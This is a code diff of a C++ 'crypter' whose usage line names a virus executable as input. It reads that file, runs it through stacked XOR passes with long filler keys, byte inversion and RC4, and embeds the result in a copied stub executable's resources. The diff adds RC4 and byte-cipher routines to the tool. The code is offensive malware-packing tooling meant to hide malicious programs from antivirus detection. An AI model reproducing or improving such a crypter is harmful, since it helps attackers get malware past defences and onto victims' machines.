@@ -60,13 +60,19 @@ char name[MAX_PATH];   // We will store the Name of the Crypted file here
 
 std::vector<char> file_data;  // With your current program, make this a global.
 
-std::string key = "0123456789abcdef";
-std::string iv = "aaaaaaaaaaaaaaaa";
+void rc4_init(unsigned char* key, unsigned int key_length);
+unsigned char rc4_output();
+char cycle(char value);
+void byteCipher(int mode, std::vector<char> &data);
+unsigned int i, j;
+unsigned char S[0x100]; // dec 256
+
+
 
 void RDF() //The Function that Reads the File and Copies the stub
 {
 	DWORD bt;
-
+								
 	//cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
 	//cout << "File Name: ";
 	//cin >> name; // Ask for input from the user and store that inputed value in the name variable
@@ -74,9 +80,9 @@ void RDF() //The Function that Reads the File and Copies the stub
 	//cin >> output;
 	CopyFile("stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
 	// ofcourse we can just update the resources with new data but whatever
-
+	
 	std::cout << "\nGetting the HANDLE of the file to be crypted\n";
-	HANDLE efile = CreateFile(name, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE efile = CreateFile(name, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);	
 	//^ Get the handle of the file to be crypted
 	std::cout << "Getting the File size\n";
 	fs = GetFileSize(efile, NULL);
@@ -104,7 +110,7 @@ void xor_crypt(const std::string &key, std::vector<char> &data)
 
 	/*ofstream out("After_enc.dat");
 	for (std::vector<char>::const_iterator it = data.begin(), itEnd = data.end(); it != itEnd; ++it)
-	out << *it;*/
+		out << *it;*/
 }
 
 void Encrypt(std::vector<char> &data)
@@ -149,21 +155,21 @@ void enc() // The function that Encrypts the info on the FB buffer
 	case '1':
 		break;
 	case '2':
-	{
-				/*ofstream myfile("2.dat");
-				for (std::vector<char>::const_iterator it = file_data.begin(), itEnd = file_data.end(); it != itEnd; ++it)
+		{
+			/*ofstream myfile("2.dat");
+			for (std::vector<char>::const_iterator it = file_data.begin(), itEnd = file_data.end(); it != itEnd; ++it)
 				myfile << *it;*/
 				xor_crypt("This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.", file_data); //Encrypt it
 				Encrypt(file_data);
-				xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", file_data); //Encrypt it
-				xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", file_data); //Encrypt it
+			xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", file_data); //Encrypt it
+			xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", file_data); //Encrypt it
 
-				xor_crypt("This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.", file_data); //Encrypt it
-				Encrypt(file_data);
-				xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", file_data); //Encrypt it
-				xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", file_data); //Encrypt it
+			xor_crypt("This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.", file_data); //Encrypt it
+			Encrypt(file_data);
+			xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", file_data); //Encrypt it
+			xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", file_data); //Encrypt it
 
-				break;
+			break;
 	}
 	case '3':
 	{
@@ -171,7 +177,7 @@ void enc() // The function that Encrypts the info on the FB buffer
 				break;
 	}
 	case '4':
-	{
+	{			byteCipher(0, file_data);
 				break;
 	}
 
@@ -190,13 +196,13 @@ void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) /
 
 int main(int argc, char* argv[]) // The main function (Entry point)
 {
-
+	
 	if (argc < 4)
 	{
 		printf("C++ crypter usage:\ncrypter.exe <virus.exe> <output name>\n");
 		return 1;
 	}
-
+	
 	std::string key = "penguin";
 	std::string name1 = argv[1];
 	std::string output1 = argv[2];
@@ -205,7 +211,7 @@ int main(int argc, char* argv[]) // The main function (Entry point)
 
 	strcpy(name, name1.c_str());
 	strcpy(output, output1.c_str());
-
+	
 	std::cout << name << std::endl;
 	RDF(); //Read the file
 	//choose_enc();
@@ -216,4 +222,98 @@ int main(int argc, char* argv[]) // The main function (Entry point)
 	std::cout << "Your File Has Been Crypted!\n";
 	//system("PAUSE");
 }
+
+
+
+
+
+/////
+
+	void byteCipher(int mode, std::vector<char> &data){
+		
+		std::string keyString = "penguin";
+		if (mode == 2) {
+
+			rc4_init((unsigned char *)keyString.c_str(), keyString.length()); // setting up RC4 using the password
+		}
+		// RC4 setup
+		// loop until file pointer has reached the end of the file
+		
+		for (int i = 0; i < data.size(); i++){
+			// going over every byte in the file
+			switch (mode) {
+			case 0: // inversion
+				data[i] = ~data[i];
+				break;
+			case 1: // cycle
+				//data[i] = cycle(data[i]);
+				break;
+			case 2: // RC4
+				data[i] = data[i] ^ rc4_output();
+				break;
+			}
+		}
+			/*for (int i = 0; i < data.size(); i++){
+					data[i] = data[i] ^ rc4_output();
+				}*/
+		
+	}
+	/*status: completed
+
+	* description:
+
+	* byte cycling algorithm
+
+	*/
+
+	char cycle(char value)
+	{
+
+		int leftMask = 170;
+
+		int rightMask = 85;
+
+		int iLeft = value & leftMask;
+
+		int iRight = value & rightMask;
+
+		iLeft = iLeft >> 1;
+		iRight = iRight << 1;
+		return iLeft | iRight;
+	}
+	// ---------------------------------------------------------------------------
+	/* status: completed
+	* description:
+	* RC4 stream initializer
+	*/
+	void rc4_init(unsigned char* key, unsigned int key_length) {
+		for (i = 0; i < 0x100; i++)
+			S[i] = i;
+		for (i = j = 0; i < 0x100; i++) {
+			unsigned char temp;
+			j = (j + key[i % key_length] + S[i]) & 0xFF;
+			temp = S[i];
+			S[i] = S[j];
+			S[j] = temp;
+		}
+		i = j = 0;
+	}
+	// ---------------------------------------------------------------------------
+	/* status: completed
+	* description:
+	* RC4 stream byte generator
+	*/
+	unsigned char rc4_output()
+	{
+		unsigned char temp;
+		i = (i + 1) & 0xFF;
+		j = (j + S[i]) & 0xFF;
+		temp = S[i];
+		S[i] = S[j];
+		S[j] = temp;
+		return S[(S[i] + S[j]) & 0xFF];
+	}
+	//---------------------------------------------------------------------------
+
+
 
